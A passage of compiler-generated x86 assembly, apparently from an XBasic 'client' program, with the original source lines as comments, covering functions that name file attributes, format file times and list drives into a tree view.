	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [974] CASE (a & $$FILE_ATTRIBUTE_OFFLINE)		 :name = attributeCheck(name) + "Offline"
case.0052.000D.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,4096			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.000E.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0263.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [975] CASE (a & $$FILE_ATTRIBUTE_DEVICE)		 :name = attributeCheck(name) + "Device"
case.0052.000E.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,64			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.000F.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0264.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [976] CASE (a & $$FILE_ATTRIBUTE_NOT_CONTENT_INDEXED) :name = attributeCheck(name) + "Not Content Indexed"
case.0052.000F.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,8192			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0010.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0265.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [977] END SELECT
case.0052.0010.client:
end.select.0052.client:
;
; [979] RETURN name
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func5F.client			;;; i258
;
; [980] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.FileAttributeToName.client:  ;;; Function end label for Assembly Programmers.
end.func5F.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func5F.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func5F.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  FileAttributeToName ()  *****
;  *****
;
; [982] 'function ripped from one of the listview examples
;
; [983] FUNCTION STRING FileTimeToDateAndTime (filetimeh, filetimel)
.code
;
#ifdef FileTimeToDateAndTime.filetimeh
#undef FileTimeToDateAndTime.filetimeh
#endif
#define FileTimeToDateAndTime.filetimeh ebp+8	; exposes function argument 'filetimeh'
;
;
#ifdef FileTimeToDateAndTime.filetimel
#undef FileTimeToDateAndTime.filetimel
#endif
#define FileTimeToDateAndTime.filetimel ebp+12	; exposes function argument 'filetimel'
;
align 16
_FileTimeToDateAndTime.client@8:
;  *****
;  *****  FUNCTION  FileTimeToDateAndTime ()  *****
;  *****
func62.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func62.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.193:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.193			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,128			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+16]			;;; i125a
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
funcBody62.client:
;
; [984] SYSTEMTIME  st
; .composites = ebp-40	; internal variable
#ifdef FileTimeToDateAndTime.st
#undef FileTimeToDateAndTime.st
#endif
#define FileTimeToDateAndTime.st ebp-44	; exposes local variable 'st'
;
;
; [985] FILETIME  ft
#ifdef FileTimeToDateAndTime.ft
#undef FileTimeToDateAndTime.ft
#endif
#define FileTimeToDateAndTime.ft ebp-48	; exposes local variable 'ft'
;
;
; [987] ft.dwLowDateTime = filetimel
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp+12]			;;; i665
	mov	d[eax],ebx			;;; i13b
;
; [988] ft.dwHighDateTime = filetimeh
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp+8]			;;; i665
	mov	d[eax+4],ebx			;;; i13b
;
; [989] IFZ FileTimeToSystemTime (&ft, &st) THEN RETURN ""
;
; [0] EXTERNAL FUNCTION FileTimeToSystemTime (lpFileTime, lpSystemTime)
	mov	eax,d[ebp-48]			;;; i642
; .xstk62.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-56]			;;; i674a
	call	_FileTimeToSystemTime@8			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.0053.client			;;; i195
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func62.client			;;; i258
else.0053.client:
end.if.0053.client:
;
; [991] year = st.year
#ifdef FileTimeToDateAndTime.year
#undef FileTimeToDateAndTime.year
#endif
#define FileTimeToDateAndTime.year ebp-60	; exposes local variable 'year'
;
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax]			;;; i313b
	mov	d[ebp-60],eax			;;; i670
;
; [992] month = st.month
#ifdef FileTimeToDateAndTime.month
#undef FileTimeToDateAndTime.month
#endif
#define FileTimeToDateAndTime.month ebp-64	; exposes local variable 'month'
;
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+2]			;;; i313b
	mov	d[ebp-64],eax			;;; i670
;
; [993] day = st.day
#ifdef FileTimeToDateAndTime.day
#undef FileTimeToDateAndTime.day
#endif
#define FileTimeToDateAndTime.day ebp-68	; exposes local variable 'day'
;
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+6]			;;; i313b
	mov	d[ebp-68],eax			;;; i670
;
; [994] weekDay = st.weekDay
#ifdef FileTimeToDateAndTime.weekDay
#undef FileTimeToDateAndTime.weekDay
#endif
#define FileTimeToDateAndTime.weekDay ebp-72	; exposes local variable 'weekDay'
;
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+4]			;;; i313b
	mov	d[ebp-72],eax			;;; i670
;
; [995] hour = st.hour
#ifdef FileTimeToDateAndTime.hour
#undef FileTimeToDateAndTime.hour
#endif
#define FileTimeToDateAndTime.hour ebp-76	; exposes local variable 'hour'
;
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+8]			;;; i313b
	mov	d[ebp-76],eax			;;; i670
;
; [996] minute = st.minute
#ifdef FileTimeToDateAndTime.minute
#undef FileTimeToDateAndTime.minute
#endif
#define FileTimeToDateAndTime.minute ebp-80	; exposes local variable 'minute'
;
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+10]			;;; i313b
	mov	d[ebp-80],eax			;;; i670
;
; [997] second = st.second
#ifdef FileTimeToDateAndTime.second
#undef FileTimeToDateAndTime.second
#endif
#define FileTimeToDateAndTime.second ebp-84	; exposes local variable 'second'
;
	mov	eax,d[ebp-44]			;;; i665
	movzx	eax,w[eax+12]			;;; i313b
	mov	d[ebp-84],eax			;;; i670
;
; [999] month$ = STRING$(month)
#ifdef FileTimeToDateAndTime.month$
#undef FileTimeToDateAndTime.month$
#endif
#define FileTimeToDateAndTime.month$ ebp-88	; exposes local variable 'month$'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-64]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	lea	ebx,[ebp-88]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1000] IF LEN(month$) < 2 THEN month$ = "0" + month$
	mov	eax,d[ebp-88]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.185			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.185:
	cmp	eax,2			;;; i684a
	jge	>> else.0054.client			;;; i219
	mov	eax,addr @_string.027B.client			;;; i663
	mov	ebx,[ebp-88]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-88]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0054.client:
end.if.0054.client:
;
; [1001] day$ = STRING$(day)
#ifdef FileTimeToDateAndTime.day$
#undef FileTimeToDateAndTime.day$
#endif
#define FileTimeToDateAndTime.day$ ebp-92	; exposes local variable 'day$'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-68]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	lea	ebx,[ebp-92]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1002] IF LEN(day$) < 2 THEN day$ = "0" + day$
	mov	eax,d[ebp-92]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.186			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.186:
	cmp	eax,2			;;; i684a
	jge	>> else.0055.client			;;; i219
	mov	eax,addr @_string.027B.client			;;; i663
	mov	ebx,[ebp-92]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-92]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0055.client:
end.if.0055.client:
;
; [1003] date$ = month$ + "/" + day$ + "/" + STRING$(year)
#ifdef FileTimeToDateAndTime.date$
#undef FileTimeToDateAndTime.date$
#endif
#define FileTimeToDateAndTime.date$ ebp-96	; exposes local variable 'date$'
;
	mov	eax,[ebp-88]			;;; i665
	mov	ebx,addr @_string.027E.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-92]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.027E.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-56],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-60]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-56]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-96]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1004] hour$ = STRING$(hour)
#ifdef FileTimeToDateAndTime.hour$
#undef FileTimeToDateAndTime.hour$
#endif
#define FileTimeToDateAndTime.hour$ ebp-100	; exposes local variable 'hour$'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-76]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	lea	ebx,[ebp-100]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1005] IF LEN(hour$) < 2 THEN hour$ = "0" + hour$
	mov	eax,d[ebp-100]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.187			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.187:
	cmp	eax,2			;;; i684a
	jge	>> else.0056.client			;;; i219
	mov	eax,addr @_string.027B.client			;;; i663
	mov	ebx,[ebp-100]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-100]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0056.client:
end.if.0056.client:
;
; [1006] minute$ = STRING$(hour)
#ifdef FileTimeToDateAndTime.minute$
#undef FileTimeToDateAndTime.minute$
#endif
#define FileTimeToDateAndTime.minute$ ebp-104	; exposes local variable 'minute$'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-76]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	lea	ebx,[ebp-104]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1007] IF LEN(minute$) < 2 THEN minute$ = "0" + minute$
	mov	eax,d[ebp-104]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.188			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.188:
	cmp	eax,2			;;; i684a
	jge	>> else.0057.client			;;; i219
	mov	eax,addr @_string.027B.client			;;; i663
	mov	ebx,[ebp-104]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-104]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0057.client:
end.if.0057.client:
;
; [1008] time$ = hour$ + ":" + minute$
#ifdef FileTimeToDateAndTime.time$
#undef FileTimeToDateAndTime.time$
#endif
#define FileTimeToDateAndTime.time$ ebp-108	; exposes local variable 'time$'
;
	mov	eax,[ebp-100]			;;; i665
	mov	ebx,addr @_string.0147.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-104]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-108]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1009] IF hour > 11 && hour < 24 THEN
	mov	eax,d[ebp-76]			;;; i665
	cmp	eax,11			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jle	> A.189			;;; i467
	not	eax			;;; i468
A.189:
;+peep
	mov	ebx,d[ebp-76]			;;; i665
	cmp	ebx,24			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jge	> A.190			;;; i467
	not	ebx			;;; i468
A.190:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i220
	jz	>> else.0058.client			;;; i221
;
; [1010] ampm$ = "pm"
#ifdef FileTimeToDateAndTime.ampm$
#undef FileTimeToDateAndTime.ampm$
#endif
#define FileTimeToDateAndTime.ampm$ ebp-112	; exposes local variable 'ampm$'
;
	mov	eax,addr @_string.0285.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-112]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1011] ELSE
	jmp	end.if.0058.client			;;; i107
else.0058.client:
;
; [1012] ampm$ = "am"
	mov	eax,addr @_string.0286.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-112]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1013] END IF
end.if.0058.client:
;
; [1015] RETURN date$ + " " + time$ + ampm$
	mov	eax,[ebp-96]			;;; i665
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-108]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-112]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	jmp	end.func62.client			;;; i258
;
; [1016] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.FileTimeToDateAndTime.client:  ;;; Function end label for Assembly Programmers.
end.func62.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func62.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func62.client:
	mov	esi,[ebp-96]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-112]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-92]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-100]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-104]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-88]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-108]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  FileTimeToDateAndTime ()  *****
;  *****
;
; [1018] FUNCTION STRING attributeCheck (STRING name)
.code
;
#ifdef attributeCheck.name
#undef attributeCheck.name
#endif
#define attributeCheck.name ebp+8	; exposes function argument 'name'
;
align 16
_attributeCheck.client@4:
;  *****
;  *****  FUNCTION  attributeCheck ()  *****
;  *****
func60.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody60.client:
;
; [1020] IF name THEN
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i214
	jz	>> else.0059.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.0059.client			;;; i218
;
; [1021] RETURN name + ", "
	mov	eax,[ebp+8]			;;; i665
	mov	ebx,addr @_string.0288.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	jmp	end.func60.client			;;; i258
;
; [1022] ELSE
	jmp	end.if.0059.client			;;; i107
else.0059.client:
;
; [1023] RETURN ""
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func60.client			;;; i258
;
; [1024] END IF
end.if.0059.client:
;
; [1025] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.attributeCheck.client:  ;;; Function end label for Assembly Programmers.
end.func60.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  attributeCheck ()  *****
;  *****
;
; [1027] FUNCTION setTreeDrives (STRING drives)
.code
;
#ifdef setTreeDrives.drives
#undef setTreeDrives.drives
#endif
#define setTreeDrives.drives ebp+8	; exposes function argument 'drives'
;
align 16
_setTreeDrives.client@4:
;  *****
;  *****  FUNCTION  setTreeDrives ()  *****
;  *****
func57.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func57.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.200:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.200			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
funcBody57.client:
;
; [1028] STRING root,vname
#ifdef setTreeDrives.root
#undef setTreeDrives.root
#endif
#define setTreeDrives.root ebp-40	; exposes local variable 'root'
;
#ifdef setTreeDrives.vname
#undef setTreeDrives.vname
#endif
#define setTreeDrives.vname ebp-44	; exposes local variable 'vname'
;
;
; [1030] DO
align 8
do.005A.client:
;
; [1031] root = GetTokenEx (@drives,32,0)
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1032] IFZ root THEN EXIT DO
	mov	eax,[ebp-40]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.197			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.005B.client			;;; i192
A.197:
	jmp	end.do.005A.client			;;; i144
else.005B.client:
end.if.005B.client:
;
; [1033] type = XLONG(GetTokenEx (@drives,32,0))
#ifdef setTreeDrives.type
#undef setTreeDrives.type
#endif
#define setTreeDrives.type ebp-48	; exposes local variable 'type'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-48],eax			;;; i670
;
; [1034] vname = GetTokenEx (@drives,',',0)
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1035] CPrint ($$main,root+" "+vname+" ("+driveTypeToName(type)+")")
	mov	eax,[ebp-40]			;;; i665
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.028D.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk57.0000 = ebp-56	; internal variable
	mov	[ebp-56],eax			;;; i670
	push	[ebp-48]			;;; i674a
	call	func3E.client			;;; i619
	mov	ebx,[ebp-56]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.028E.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1037] IF type > $$DRIVE_REMOVABLE THEN
	mov	eax,d[ebp-48]			;;; i665
	cmp	eax,2			;;; i684a
	jle	>> else.005C.client			;;; i219
;
; [1038] hItem = addToTree ("-1 "+root)
#ifdef setTreeDrives.hItem
#undef setTreeDrives.hItem
#endif
#define setTreeDrives.hItem ebp-60	; exposes local variable 'hItem'
;
	mov	eax,addr @_string.014B.client			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	call	func4E.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	d[ebp-60],eax			;;; i670
;
; [1039] IF hItem THEN
	mov	eax,d[ebp-60]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.005D.client			;;; i221
;
; [1040] IFZ getTreeChild (hItem) THEN
	push	[ebp-60]			;;; i674a
	call	func55.client			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.005E.client			;;; i195
;
; [1041] setTreeChild (hItem)
	push	[ebp-60]			;;; i674a
	call	func56.client			;;; i619
;
; [1042] SendSMessage(idx,"treeb "+STRING$(hItem)+" "+root)
#ifdef setTreeDrives.idx
#undef setTreeDrives.idx
#endif
#define setTreeDrives.idx ebp-64	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-60]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.014D.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-64]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1043] Sleep (1000)
	push	1000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1044] END IF
else.005E.client:
end.if.005E.client:
;
; [1045] END IF
else.005D.client:
end.if.005D.client:
;
; [1046] END IF
else.005C.client:
end.if.005C.client:
;
; [1047] LOOP WHILE (drives != "")
do.loop.005A.client:
	mov	eax,[ebp+8]			;;; i665
	xor	ebx,ebx			;;; i658
	call	%_string.compare.vv			;;; i690
	jne	< do.005A.client			;;; i193
end.do.005A.client:
;
; [1049] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.setTreeDrives.client:  ;;; Function end label for Assembly Programmers.
end.func57.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func57.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func57.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
